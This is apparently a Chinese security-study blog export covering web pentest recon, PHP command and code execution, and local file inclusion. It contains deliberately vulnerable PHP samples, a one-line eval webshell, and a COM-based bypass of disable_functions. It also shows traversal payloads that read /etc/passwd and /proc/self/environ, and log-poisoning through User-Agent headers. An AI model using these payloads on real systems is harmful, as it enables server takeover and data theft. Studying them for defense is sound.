<p><a href="http://www.xiaodi8.com/hack" target="_blank" rel="noopener">www.xiaodi8.com/hack</a><br><a href="http://www.xiaodi8.com/bbs" target="_blank" rel="noopener">www.xiaodi8.com/bbs</a></p>
</li>
<li><p>二级域名：<br>Hack.xiaodi8.com<br>Bbs.xiaodi8.com</p>
</li>
<li><p>工具类：layer</p>
</li>
<li><p>搜索引擎：谷歌语法</p>
</li>
</ul>
</li>
<li><p>谷歌黑客</p>
</li>
<li><p>短文件漏洞</p>
</li>
<li><p>社工</p>
</li>
</ul>
<h2 id="03-后台获取webshell"><a href="#03-后台获取webshell" class="headerlink" title="03-后台获取webshell"></a>03-后台获取webshell</h2><ul>
<li>Cms后台拿shell<ul>
<li>常见cms：dedecms，discuz，phpcms，phpweb，ecshop，dvbbs，aspcms，ekucms等</li>
<li>拿shell：直接百度搜索</li>
</ul>
</li>
<li>非cms后台拿shell<ul>
<li>标准：根据后台功能尝试</li>
<li>常规方法：数据库备份，抓包上传，编辑器获取，模版修改，sql命令导出，配置文件插马等</li>
<li>Cms网站程序识别<ul>
<li>工具：指纹识别，whatweb，bugscan平台</li>
<li>人工：底部文件，后台地址，网站logo等</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="04-旁注、C段"><a href="#04-旁注、C段" class="headerlink" title="04-旁注、C段"></a>04-旁注、C段</h2><ul>
<li>旁注：同服务器不同站点的渗透思路</li>
<li>C段：同网段不同服务器的渗透思路</li>
<li>目标站点A无法直接渗透，这个时候我们可以采用旁注查询到目标站点A下的同服站点（同服务器下的其他站点），从而从旁渗透到目标站点（可能会涉及到提权）</li>
<li>如果出现独立服务器（服务器只有一个站点），采用C段，通过查询IP段下的解析站点，渗透某一个服务器，继续进行内网渗透</li>
</ul>
<h2 id="05-不同脚本权限"><a href="#05-不同脚本权限" class="headerlink" title="05-不同脚本权限"></a>05-不同脚本权限</h2><ul>
<li>脚本权限不一致</li>
<li>Asp php aspx jsp cgi pl等</li>
<li>Jsp权限默认就是system</li>
<li>Asp=php</li>
<li>Aspx稍微大 user权限</li>
<li>Pl cgi py = Aspx</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>命令/代码执行</title>
    <url>/2018/01/22/web/%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="代码执行-amp-命令执行"><a href="#代码执行-amp-命令执行" class="headerlink" title="代码执行&amp;命令执行"></a>代码执行&amp;命令执行</h1><blockquote>
<p><a href="http://byd.dropsec.xyz/2016/07/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://byd.dropsec.xyz/2016/07/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p>
</blockquote>
<ul>
<li>远程代码执行是指程序代码在处理输入输出的时候没有严格控制。导致用户可以构造参数包含执行远程代码在服务器上执行，进而获取到服务器权限，是发生在应用程序的逻辑层上的漏洞</li>
</ul>
<a id="more"></a>
<h2 id="01-OS命令执行"><a href="#01-OS命令执行" class="headerlink" title="01-OS命令执行"></a>01-OS命令执行</h2><ul>
<li>系统命令执行是指应用程序对传入命令行的参数过滤不严格导致恶意用户能控制最终执行的命令，进而入侵系统，导致严重破坏的高危漏洞。(bash,shell)</li>
<li>shell是系统的用户界面，提供用户与内核交互操作的接口，它接收用户输入的命令并把它送入到内核去执行。实际上shell是一个命令解释器，它的一个重要特性就是它自身就是一个解释型的程序语言。</li>
<li>分类<ul>
<li>OS本身命令执行</li>
<li>Web命令执行</li>
<li>数据库命令执行</li>
<li>第三方软件命令执行</li>
</ul>
</li>
</ul>
<h2 id="02-命令执行模型"><a href="#02-命令执行模型" class="headerlink" title="02-命令执行模型"></a>02-命令执行模型</h2><h3 id="2-1-php命令执行函数利用"><a href="#2-1-php命令执行函数利用" class="headerlink" title="2.1-php命令执行函数利用"></a>2.1-php命令执行函数利用</h3><h4 id="1、system"><a href="#1、system" class="headerlink" title="1、system"></a>1、system</h4><ul>
<li><p>system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型为：</p>
<ul>
<li><code>string system(string command,int &amp;return_var)</code></li>
<li>其中，command是要执行的命令，return_var存放执行命令的执行后的状态。</li>
</ul>
</li>
<li><p>code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir = $_GET[<span class="string">"dir"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($dir))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">    system(<span class="string">"net user"</span>.$dir);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>test.php?dir</code>来测试</p>
</li>
<li><p>上述代码就是把dir这个命令写死了，把net user执行的结果给$dir变量。但是注意一些连接符，管道符如：&amp;,&amp;&amp;,|,||,:等，如果我们输入?dir=| netstat -an</p>
</li>
<li><p>注：|只执行后面的命令，||前后命令都执行。</p>
</li>
<li><p>实际测试中，|只执行后面的命令；||只执行前面的命令；&amp;都执行；&amp;&amp;都执行；（&amp;时要注意url编码，否则与url中表示变量的分割符混淆）</p>
</li>
</ul>
<h4 id="2、exec"><a href="#2、exec" class="headerlink" title="2、exec"></a>2、exec</h4><ul>
<li><p>exec函数可以用来执行一个外部的应用程序，函    数原型为：</p>
<ul>
<li>string exec(string command,array &amp;output,int &amp;return_var)</li>
<li>其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var是存放执行命令后的状态值。</li>
</ul>
</li>
<li><p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">	$output = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">	exec($cmd,$output);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="keyword">list</span>($key,$value)=each($output))</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="keyword">echo</span> $value.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>1.php?cmd=net user</code></p>
</li>
</ul>
<h4 id="3、passthru"><a href="#3、passthru" class="headerlink" title="3、passthru"></a>3、passthru</h4><ul>
<li><p>passthru函数可以用来执行一个unix系统命令并显示原始的输出，当unix系统令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system和exec函数。原型为：</p>
<ul>
<li>void passthru(string command,int &amp;teturn_var)</li>
<li>其中command是要执行的命令，return_var存放执行命令后的状态值。</li>
</ul>
</li>
<li><p>示例代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">passthru($cmd);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>1.php?cmd=net user</code></p>
</li>
</ul>
<h4 id="4、shell-exec"><a href="#4、shell-exec" class="headerlink" title="4、shell_exec"></a>4、shell_exec</h4><ul>
<li><p>执行shell命令并返回输出的字符串，函数原型为</p>
<ul>
<li>string shell_exec(string command)</li>
<li>其中command是要执行的命令。</li>
</ul>
</li>
<li><p>code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">	shell_exec($cmd);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>实测执行失败：</p>
<ul>
<li>要echo shell_exec($cmd);</li>
</ul>
</li>
</ul>
<h4 id="5、-运算符"><a href="#5、-运算符" class="headerlink" title="5、`运算符"></a>5、`运算符</h4><ul>
<li><p>与shell_exec功能相同，通常用于绕过黑名单</p>
</li>
<li><p>示例代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">	$output = `$cmd`;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $output;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>1.php?cmd=net user</code>即可</p>
</li>
</ul>
<h3 id="2-2-eval注入利用攻击"><a href="#2-2-eval注入利用攻击" class="headerlink" title="2.2-eval注入利用攻击"></a>2.2-eval注入利用攻击</h3><ul>
<li><p>出来可以利用函数命令注入攻击方式外还可以使用eval注入攻击方式，eval函数会将参数字符串作为php程序代码来执行，用户可以将php代码保存成字符串的形式，然后传递给eval函数执行。</p>
</li>
<li><p>原型为</p>
<ul>
<li><code>mixed eval(string code_str)</code></li>
<li>其中code_str是php代码字符串，通过构造传入eval函数中的全部或部分字符串的内容实现命令注入攻击。</li>
</ul>
</li>
<li><p>示例代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">	<span class="keyword">eval</span>($cmd);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果传入的内容为phpinfo();,若传入的是一句话木马&lt;?php eval($_POST[cmd]);?&gt;就可以直接拿shell。</li>
</ul>
</li>
<li><p>示例结果</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/83464068.jpg" alt></p>
<ul>
<li>执行的是php代码而非系统命令，一定要带上php语句中的分号结尾</li>
</ul>
</li>
</ul>
<h3 id="2-3-php-Webshell命令执行防御"><a href="#2-3-php-Webshell命令执行防御" class="headerlink" title="2.3-php Webshell命令执行防御"></a>2.3-php Webshell命令执行防御</h3><ul>
<li><p>PHP的配置文件php.ini里面有个disable_functions =</p>
</li>
<li><p>配置这个，禁止某些php函数，便可以禁止php的命令执行漏洞，例如：</p>
<p><code>disable_functions=system,passthru,shell_exec,exec,popen</code></p>
</li>
</ul>
<h3 id="2-4-php-Webshell命令执行绕过方法"><a href="#2-4-php-Webshell命令执行绕过方法" class="headerlink" title="2.4-php Webshell命令执行绕过方法"></a>2.4-php Webshell命令执行绕过方法</h3><h4 id="1、黑名单绕过"><a href="#1、黑名单绕过" class="headerlink" title="1、黑名单绕过"></a>1、黑名单绕过</h4><ul>
<li><p>php能够执行系统命令的函数有</p>
<p><code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,</code>(反单引号)`</p>
</li>
<li><p>根据黑名单中没有的函数，即可绕过。</p>
</li>
</ul>
<h4 id="2、系统组件绕过"><a href="#2、系统组件绕过" class="headerlink" title="2、系统组件绕过"></a>2、系统组件绕过</h4><ul>
<li><p>只适用于windows，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = $_POST[a];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>);    <span class="comment">//生成一个COM对象</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">'cmd.exe /c '</span>.$command);    <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如何防御：直接删除system32下的wshom.ocx文件</p>
</li>
</ul>
<h4 id="3、扩展库绕过"><a href="#3、扩展库绕过" class="headerlink" title="3、扩展库绕过"></a>3、扩展库绕过</h4><h3 id="2-5-php-create-function-注入命令执行漏洞"><a href="#2-5-php-create-function-注入命令执行漏洞" class="headerlink" title="2.5-php create_function()注入命令执行漏洞"></a>2.5-php create_function()注入命令执行漏洞</h3><ul>
<li>在PHP中使用create_function()创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。</li>
</ul>
<h2 id="03-其它相关"><a href="#03-其它相关" class="headerlink" title="03-其它相关"></a>03-其它相关</h2><ul>
<li><p>浅谈CTF中命令执行与绕过的小技巧</p>
<p><code>http://www.freebuf.com/articles/web/137923.html</code></p>
</li>
<li><p>Linux下反弹shell方法</p>
<p><code>https://www.waitalone.cn/linux-shell-rebound-under-way.html</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2018/01/22/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><blockquote>
<p><code>&lt;http://www.cnblogs.com/iamstudy/articles/include_file.html&gt;</code></p>
<p><code>&lt;http://www.cnblogs.com/littlehann/p/3665062.html&gt;</code></p>
</blockquote>
<h2 id="01-简述-amp-原理"><a href="#01-简述-amp-原理" class="headerlink" title="01-简述&amp;原理"></a>01-简述&amp;原理</h2><ul>
<li><p>如果允许客户端用户输入控制动态包含在服务器端的文件</p>
<ul>
<li>导致后果：</li>
<li>恶意代码的执行；</li>
<li>敏感信息泄露</li>
</ul>
</li>
</ul>
<a id="more"></a>
<ul>
<li><p>主要包括</p>
<ul>
<li>本地文件包含</li>
<li>远程文件包含</li>
</ul>
</li>
<li><p>常见包含函数有</p>
<ul>
<li>include()</li>
<li>require()</li>
</ul>
</li>
<li><p>各函数区别</p>
<ul>
<li>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</li>
<li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li>
<li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li>
<li>require一般是用于文件头包含类文件、数据库等等文件；</li>
<li>include一般是用于包含html模版文件；</li>
</ul>
</li>
<li><p>基本代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'f'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $file;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">	@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="02-本地包含"><a href="#02-本地包含" class="headerlink" title="02-本地包含"></a>02-本地包含</h2><h3 id="2-1-包含目录文件"><a href="#2-1-包含目录文件" class="headerlink" title="2.1-包含目录文件"></a>2.1-包含目录文件</h3><h4 id="2-1-1-代码执行或文件内容泄露"><a href="#2-1-1-代码执行或文件内容泄露" class="headerlink" title="2.1.1-代码执行或文件内容泄露"></a>2.1.1-代码执行或文件内容泄露</h4><ul>
<li><code>index.php?f=test.txt</code></li>
<li>如果里面的内容是php格式（尽管后缀不是php）<ul>
<li>则内容会被当成php执行</li>
</ul>
</li>
<li>不是php<ul>
<li>则会读取到文件内容(用来读取/etc/passw等等配置文件的敏感信息)</li>
</ul>
</li>
</ul>
<h4 id="2-1-2-目录遍历"><a href="#2-1-2-目录遍历" class="headerlink" title="2.1.2-目录遍历"></a>2.1.2-目录遍历</h4><ul>
<li><p><code>index.php?f=./../../test.txt</code>（./当前目录,../上一级目录,这样的遍历目录来读取文件）</p>
</li>
<li><p>测试了四个文件，不同目录下的222.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前目录</span><br><span class="line">E:\Office\phpStudy\www\test</span><br><span class="line">?f=./222.txt</span><br><span class="line"></span><br><span class="line">当前目录的某下一级</span><br><span class="line">E:\Office\phpStudy\www\\test\tmp?f=./tmp/222.txt</span><br><span class="line"></span><br><span class="line">上层目录</span><br><span class="line">E:\Office\phpStudy\www?f=./../222.txt</span><br><span class="line"></span><br><span class="line">上上层目录</span><br><span class="line">E:\Office\phpStudy?f=./../../222.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意</p>
<ul>
<li><p>上述4个，可以不加./，默认会有，最好加，便于观察</p>
</li>
<li><p>加几个../的问题</p>
<ul>
<li>当前目录 和 所包含文件目录 中 ‘/‘ 的个数</li>
<li>如：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">E:\Office\phpStudy\www\test\index.php </span><br><span class="line">当前目录为test；</span><br><span class="line">E:\Office\phpStudy\222.txt；</span><br><span class="line">222.txt所在目录为phpstudy；</span><br><span class="line">共有两个\，需要两个../；</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h4 id="2-1-3-其它"><a href="#2-1-3-其它" class="headerlink" title="2.1.3-其它"></a>2.1.3-其它</h4><ul>
<li>实例：<ul>
<li>本地乌云漏洞库搜索；</li>
</ul>
</li>
<li>文件读取漏洞路径收集：<ul>
<li><code>&lt;https://3wapp.github.io/WebSecurity/path_collect.html&gt;</code></li>
</ul>
</li>
</ul>
<h3 id="2-2-包含日志文件"><a href="#2-2-包含日志文件" class="headerlink" title="2.2-包含日志文件"></a>2.2-包含日志文件</h3><h4 id="2-2-0简介"><a href="#2-2-0简介" class="headerlink" title="2.2.0简介"></a>2.2.0简介</h4><ul>
<li><p>包含access log、error log。</p>
</li>
<li><p>需要知道log文件的路径</p>
<ul>
<li>可以先读一下nginx、apache默认的配置文件位置</li>
<li>例如/usr/local/nginx/conf/nginx.conf、/etc/httpd/conf/httpd.conf等等</li>
</ul>
</li>
<li><p>需要有权限</p>
<ul>
<li><p>如果apache是通过yum安装的话，那么默认log文件的位置是/var/log/httpd/</p>
</li>
<li><p>我们首先包含<a href="http://172.16.100.168:8080/post.php?file=../../../../../var/log/httpd/access_log" target="_blank" rel="noopener">http://172.16.100.168:8080/post.php?file=../../../../../var/log/httpd/access_log</a></p>
</li>
<li><p>发现返回界面为空，可能权限不够，我们来看一下权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@vincent log]# ls -ld httpd/</span><br><span class="line">drwx——. 2 root root 4096 8月  15 04:08 httpd/</span><br><span class="line">[root@vincent httpd]# ll access_log</span><br><span class="line">-rw-r–r– 1 root root 2562 8月  15 07:41 access_log</span><br></pre></td></tr></table></figure>
</li>
<li><p>这里因为httpd目录的other权限为0，所有apache的默认启动账户apache是无法进入这个目录的，我们为了测试修改一下权限。</p>
<p><code>[root@vincent log]# chmod 701 httpd/</code></p>
</li>
<li><p>然后访问<a href="http://172.16.100.168:8080/post.php?file=../../../../../var/log/httpd/access_log发现可以包含到access_log了" target="_blank" rel="noopener">http://172.16.100.168:8080/post.php?file=../../../../../var/log/httpd/access_log发现可以包含到access_log了</a></p>
</li>
</ul>
</li>
<li><p>我们将UA修改为&lt;?php phpinfo();?&gt;就可以了。另外可以直接写到参数中，不过因为使用Firefox提交172.16.100.168:8080/post.php?file=&lt;?php phpinfo();?&gt;的话记录到日志的内容会将尖括号和空格进行URL编码，所以使用BURP提交。</p>
</li>
<li><p>但是如果access log文件太大，基本无法包含成功，可以尝试包含error log，error log一般小一些。</p>
</li>
<li><p>我们随便访问一个不存在的路径，然后增加个referer:&lt;?php phpinfo();?&gt;就可以了，来看下error_log</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Mon Aug 15 08:19:40 2016] [error] [client 172.16.100.1] File does not exist: /var/www/html/12324324, referer: &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>无法上传文件的时候,可以尝试利用UA插入payload到日志文件,然后包含容器的日志文件    (错误、访问文件都行)。</li>
</ul>
</li>
<li><p>注意：</p>
<ul>
<li>日志文件通常很大，文件包含时可能导致浏览器卡死；</li>
<li>选择凌晨包含最好,payload后面加一个exit()退出程序,以防大日志导致浏览器卡死,如果包含不成功,也许是open_basedir限制了目录。</li>
</ul>
</li>
</ul>
<h4 id="2-2-1-日志文件分析（访问日志和错误日志）"><a href="#2-2-1-日志文件分析（访问日志和错误日志）" class="headerlink" title="2.2.1-日志文件分析（访问日志和错误日志）"></a>2.2.1-日志文件分析（访问日志和错误日志）</h4><blockquote>
<p><a href="http://www.jb51.net/article/47714.htm" target="_blank" rel="noopener">http://www.jb51.net/article/47714.htm</a><br><a href="http://www.blogdaren.com/m/?post=1129（错误日志详解）" target="_blank" rel="noopener">http://www.blogdaren.com/m/?post=1129（错误日志详解）</a></p>
</blockquote>
<ul>
<li><p>apache的配置文件httpd.conf关于日志文件的配置</p>
</li>
<li><p>访问日志</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/44295054.jpg" alt></p>
<ul>
<li><p><code>#CustomLog &quot;logs/access.log&quot; common</code></p>
</li>
<li><p>日志记录有7个字段，如</p>
<p><code>127.0.0.1 - - [01/Aug/2017:20:24:19 +0800] &quot;GET /test/1.php?f=222.txt HTTP/1.1&quot; 200 38</code></p>
</li>
<li><p><code>#CustomLog &quot;logs/access.log&quot; combined</code></p>
<p>有9个字段，多了referer和User-Agent字段；</p>
</li>
</ul>
</li>
<li><p>错误日志</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/49003385.jpg" alt></p>
</li>
</ul>
<h4 id="2-2-2-表示错误日志的位置和错误日志等级"><a href="#2-2-2-表示错误日志的位置和错误日志等级" class="headerlink" title="2.2.2-表示错误日志的位置和错误日志等级"></a>2.2.2-表示错误日志的位置和错误日志等级</h4><blockquote>
<p>详情百度</p>
</blockquote>
<h4 id="2-2-3-测试1（访问文件处写入）"><a href="#2-2-3-测试1（访问文件处写入）" class="headerlink" title="2.2.3-测试1（访问文件处写入）"></a>2.2.3-测试1（访问文件处写入）</h4><ul>
<li><p>访问  <code>http://127.0.0.1/test/1.php?f=222.txt&lt;?php%20phpinfo();?&gt;</code></p>
</li>
<li><p>日志文件会增加一条 记录：</p>
<p><code>127.0.0.1 - - [01/Aug/2017:20:31:44 +0800] &quot;GET /test/1.php?f=222.txt%3C?php%20phpinfo();?%3E HTTP/1.1&quot; 200 29</code></p>
</li>
<li><p>注意，在这特殊字符被url编码；浏览器的锅。</p>
</li>
<li><p>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">日志文件所在目录：</span><br><span class="line">E:\Office\phpStudy\Apache\logs</span><br><span class="line">当前目录：</span><br><span class="line">E:\Office\phpStudy\WWW\test</span><br><span class="line">因此包含时：</span><br><span class="line">?f=../../Apache/logs/access.log</span><br></pre></td></tr></table></figure>
</li>
<li><p>但是最终因&lt;&gt;被url编码没有成功；</p>
<p>（特殊字符被浏览器自动编码，浏览器的锅，burp发包即可解决；尖括号和空格都会编码；）</p>
</li>
<li></li>
</ul>
<h4 id="2-2-4-测试2（UA头写入）"><a href="#2-2-4-测试2（UA头写入）" class="headerlink" title="2.2.4-测试2（UA头写入）"></a>2.2.4-测试2（UA头写入）</h4><ul>
<li><p>更改apache配置文件httpd.conf，访问日志设置为    </p>
<p><code>CustomLog &quot;logs/access.log&quot; combined</code></p>
</li>
<li><p>使每条日志记录有9个字段，如：</p>
<p><code>127.0.0.1 - - [02/Aug/2017:09:38:11 +0800] &quot;GET /test/1.php HTTP/1.1&quot; 200 113 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;</code>（最后一个字段为ua头）</p>
</li>
<li><p>burp发包：</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/52787063.jpg" alt></p>
</li>
<li><p>日志记录</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/37057782.jpg" alt></p>
</li>
<li><p>效果</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/20373813.jpg" alt></p>
</li>
</ul>
<h4 id="2-2-5-测试3（包含错误日志）"><a href="#2-2-5-测试3（包含错误日志）" class="headerlink" title="2.2.5-测试3（包含错误日志）"></a>2.2.5-测试3（包含错误日志）</h4><ul>
<li>httpd.conf将LogLevel 改为warn（ debug, info, notice, warn, error, crit,alert, emerg），记录大于等于此等级的</li>
<li>同测试1差不多，前者包含访问日志，后者包含错误日志，都是在访问文件出写入payload；</li>
<li>此外，除了访问文件处，如何构造错误请求，使其记录在错误日志？？？</li>
</ul>
<h4 id="2-2-6-测试4（包含apache配置文件）"><a href="#2-2-6-测试4（包含apache配置文件）" class="headerlink" title="2.2.6-测试4（包含apache配置文件）"></a>2.2.6-测试4（包含apache配置文件）</h4><ul>
<li><p>包含配置文件，httpd.conf，读出其内容，可得到日志存储路径等信息</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/18-1-21/84845701.jpg" alt></p>
</li>
</ul>
<h4 id="2-2-7-其它"><a href="#2-2-7-其它" class="headerlink" title="2.2.7-其它"></a>2.2.7-其它</h4><ul>
<li>常见几个路径<ul>
<li>/var/log/apache/access_log</li>
<li>/var/www/logs/access_log</li>
<li>/var/log/access_log</li>
<li>更多见上面的路径收集</li>
</ul>
</li>
<li>包含本地文件的关键便是得到文件的物理路径；<br><code>https://3wapp.github.io/WebSecurity/path_collect.html</code></li>
</ul>
<h3 id="2-3-包含其它"><a href="#2-3-包含其它" class="headerlink" title="2.3-包含其它"></a>2.3-包含其它</h3><h4 id="2-3-1-包含系统环境"><a href="#2-3-1-包含系统环境" class="headerlink" title="2.3.1-包含系统环境"></a>2.3.1-包含系统环境</h4><ul>
<li><p>简介</p>
<ul>
<li>linux(FreeBSD是没有这个的)下的/proc/self/environ。</li>
<li>要求是php运行早cgi上面(具体没测试)…然后和包含日志一样,在User-agent修改成payload.</li>
<li>这个环境变量有访问web的session信息和包含user-agent的参数。user-agent在客户端是可以修改的</li>
</ul>
</li>
<li><p>检查proc/self/environ是否可用访问</p>
<ul>
<li><p>提交url:<a href="http://www.website.com/view.php?page=../../../../../proc/self/environ" target="_blank" rel="noopener">www.website.com/view.php?page=../../../../../proc/self/environ</a></p>
</li>
<li><p>如果看到类似如下信息:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DOCUMENT_ROOT=/home/sirgod/public_html GATEWAY_INTERFACE=CGI/1.1 HTTP_ACCEPT=text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1 HTTP_COOKIE=PHPSESSID=134cc7261b341231b9594844ac2ad7ac HTTP_HOST=www.website.com HTTP_REFERER=http://www.website.com/index.php?view=../../../../../../etc/passwd HTTP_USER_AGENT=Opera/9.80 (Windows NT 5.1; U; en) Presto/2.2.15 Version/10.00 PATH=/bin:/usr/bin QUERY_STRING=view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron REDIRECT_STATUS=200 REMOTE_ADDR=6x.1xx.4x.1xx REMOTE_PORT=35665 REQUEST_METHOD=GET REQUEST_URI=/index.php?view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron SCRIPT_FILENAME=/home/sirgod/public_html/index.php SCRIPT_NAME=/index.php SERVER_ADDR=1xx.1xx.1xx.6x SERVER_ADMIN=webmaster@website.com SERVER_NAME=www.website.com SERVER_PORT=80 SERVER_PROTOCOL=HTTP/1.0 SERVER_SIGNATURE=</span><br><span class="line">Apache/1.3.37 (Unix) mod_ssl/2.2.11 OpenSSL/0.9.8i DAV/2 mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at www.website.com Port 80</span><br></pre></td></tr></table></figure>
<ul>
<li>说明是可以访问的；</li>
</ul>
</li>
<li><p>如果返回时个空白页</p>
<ul>
<li>说明是无法访问的</li>
<li>也可能操作系统是FreeBSD</li>
</ul>
</li>
</ul>
</li>
<li><p>ua头中添加payload</p>
<ul>
<li>包含/proc/self/environ文件(linux下)，需要向User-Agent头添加代码：</li>
<li>然后再访问一下该站点，则代码就被写入/proc/self/environ中了，再包含/proc/self/envirson即可：</li>
<li>这个用法需要一定的权限，真的很鸡肋，apache用户都是root权限了，还是无法包含。</li>
</ul>
</li>
